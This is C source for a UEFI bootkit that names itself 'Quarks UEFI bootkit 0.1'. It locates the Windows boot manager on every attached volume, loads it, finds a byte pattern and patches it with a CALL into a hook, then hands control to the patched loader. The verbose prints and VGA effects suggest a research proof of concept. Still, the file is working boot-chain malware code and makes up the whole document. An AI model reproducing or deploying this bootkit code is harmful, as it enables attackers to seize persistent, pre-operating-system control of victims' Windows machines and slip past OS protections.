#include "common.h"
#include "VgaFun.h"
#include "patchs.h"



static CHAR16 *BOOTKIT_TITLE = L"--== Quarks UEFI bootkit 0.1 ==--\r\n\r\n";
static CHAR16 *WINDOWS_BOOTX64_IMAGEPATH = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
static EFI_HANDLE WINDOWS_IMAGE_HANDLE;



/*
 * Print info about current loaded image
 */
EFI_STATUS PrintLoadedImageInfo(EFI_LOADED_IMAGE *ImageInfo) 
{
	Print(L"[+] EFI_LOADED_IMAGE\r\n");
	Print(L"     ->ImageBase = %lx\r\n",ImageInfo->ImageBase);
	Print(L"     ->ImageSize = %lx\r\n",ImageInfo->ImageSize);

	return EFI_SUCCESS;
}


/*
 * Patch Windows bootloader (bootmgfw)
 */
EFI_STATUS PatchWindowsBootloader(void *BootkitImagebase,void *ImageBase,UINT64 ImageSize) 
{
	UINT32 i,j;
	INT32 call_decal;
	UINT8 found = 0;

	/* Search for pattern */
	Print(L"[+] Searching pattern in %s\r\n",WINDOWS_BOOTX64_IMAGEPATH);
	for(i=0;i<ImageSize;i++) 
	{
		for(j=0;j<sizeof(BOOTMGFW_PATTERN_Archpx64TransferTo64BitApplicationAsm);j++)
		{
			if(BOOTMGFW_PATTERN_Archpx64TransferTo64BitApplicationAsm[j] != ((UINT8 *)ImageBase)[i+j])
				break;
		}
		if(j==sizeof(BOOTMGFW_PATTERN_Archpx64TransferTo64BitApplicationAsm))
		{
			found = 1;
			break;
		}
	}

	/* If found, patch call */
	if(!found)
	{
		Print(L"[!] Not found\r\n");
		return EFI_NOT_FOUND;
	}
	else
	{
		Print(L"[+] Found at %08X, processing patch\r\n",i);
	}

	/* Save bytes */
	CopyMem(BOOTMGFW_Archpx64TransferTo64BitApplicationAsm_saved_bytes,(UINT8 *)ImageBase+i,sizeof(BOOTMGFW_Archpx64TransferTo64BitApplicationAsm_saved_bytes));

	/* Patching process */
	call_decal =  ((UINT32)&bootmgfw_Archpx64TransferTo64BitApplicationAsm_hook) - ((UINT32)ImageBase + i + 1 + sizeof(UINT32));
	*(((UINT8 *)ImageBase+i)) = 0xE8;						/* CALL opcode */
	*(UINT32 *)(((UINT8 *)ImageBase+i+1)) = call_decal;		/* CALL is relative */

	return EFI_SUCCESS;
}


/*
 * Load and patch windows EFI bootloader
 */
EFI_STATUS LoadPatchWindowsBootloader(EFI_HANDLE ParentHandle,void *BootkitImageBase,EFI_DEVICE_PATH *WinLdrDevicePath)
{
	EFI_LOADED_IMAGE *image_info;
	EFI_STATUS ret_code = EFI_NOT_FOUND;

	/* Load image in memory */
	Print(L"[+] Windows loader memory loading\r\n");
	ret_code = BS->LoadImage(TRUE,ParentHandle,WinLdrDevicePath,NULL,0,&WINDOWS_IMAGE_HANDLE);
	if(ret_code != EFI_SUCCESS)
	{
		Print(L"[!] LoadImage error = %X\r\n",ret_code);
		return ret_code;
	}
	else
	{
		/* Get memory mapping */
		BS->HandleProtocol(WINDOWS_IMAGE_HANDLE,&LoadedImageProtocol,(void **)&image_info);
		PrintLoadedImageInfo(image_info);

		/* Apply patch */
		ret_code = PatchWindowsBootloader(BootkitImageBase,image_info->ImageBase,image_info->ImageSize);
	}

	return ret_code;
}

/* 
 *Transfer control to windows bootloader 
 */
EFI_STATUS StartWindowsBootloader()
{
	return BS->StartImage(WINDOWS_IMAGE_HANDLE,(UINTN *)NULL,(CHAR16 **)NULL);
}


/*
 * Try to find WINDOWS_BOOTX64_IMAGEPATH by browsing each device
 */
EFI_STATUS LocateWindowsBootManager(EFI_DEVICE_PATH **LoaderDevicePath)
{
	EFI_FILE_IO_INTERFACE *ioDevice;
	EFI_FILE_HANDLE handleRoots,bootFile;
	EFI_HANDLE* handleArray;
	UINTN nbHandles,i;
	EFI_STATUS err;

	*LoaderDevicePath = (EFI_DEVICE_PATH *)NULL;
	err = BS->LocateHandleBuffer(ByProtocol,&FileSystemProtocol,NULL,&nbHandles,&handleArray);
	if(err != EFI_SUCCESS)
		return err;
	
	for(i=0;i<nbHandles;i++)
	{
		err = BS->HandleProtocol(handleArray[i],&FileSystemProtocol,(void **)&ioDevice);
		if(err != EFI_SUCCESS)
			continue;
		
		err=ioDevice->OpenVolume(ioDevice,&handleRoots);
		if(err != EFI_SUCCESS)
			continue;

		err = handleRoots->Open(handleRoots,&bootFile,WINDOWS_BOOTX64_IMAGEPATH,EFI_FILE_MODE_READ,EFI_FILE_READ_ONLY);
		if(err == EFI_SUCCESS)
		{
			handleRoots->Close(bootFile);
			*LoaderDevicePath = FileDevicePath(handleArray[i],WINDOWS_BOOTX64_IMAGEPATH);
			break;
		}
	}

	return err;
}


/*
 * Entry point
 */
EFI_STATUS main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
	EFI_LOADED_IMAGE *image_info;
	EFI_DEVICE_PATH *winldr_dev_path;
	EFI_STATUS err;

	/* Initialize EFI library */
	InitializeLib(ImageHandle, SystemTable);

	/* Clear screen & set color fun */
	ST->ConOut->SetAttribute(ST->ConOut,EFI_YELLOW | EFI_BACKGROUND_BLUE);
	ST->ConOut->ClearScreen(ST->ConOut);
	ST->ConOut->OutputString(ST->ConOut,BOOTKIT_TITLE);

	/* Get information about current loaded image */
	BS->HandleProtocol(ImageHandle,&LoadedImageProtocol,(void **)&image_info);
	PrintLoadedImageInfo(image_info);

	/* Load windows boot manager and begins patch process */
	err = LocateWindowsBootManager(&winldr_dev_path);
	if((err != EFI_SUCCESS) || (!winldr_dev_path))
	{
		Print(L"\r\n Cannot found windows boot manager, hmm...!?\r\n");
		return err;
	}
	else
	{
		Print(L"[+] Boot manager found at %s\r\n",DevicePathToStr(winldr_dev_path));
	}
	err = LoadPatchWindowsBootloader(ImageHandle,image_info->ImageBase,winldr_dev_path);

	Print(L"\r\n Press any key to continue \r\n");
	WaitForKey();

	if(err!=EFI_NOT_FOUND)
	{
		/* Init VGA mode and draw some funny things :) */
		if(InitVgaMode(image_info) == EFI_SUCCESS) 
			DoVgaLoop();

		/* Start windows bootloader */
		CloseVgaMode();
	}

	StartWindowsBootloader();

	return EFI_SUCCESS;
}
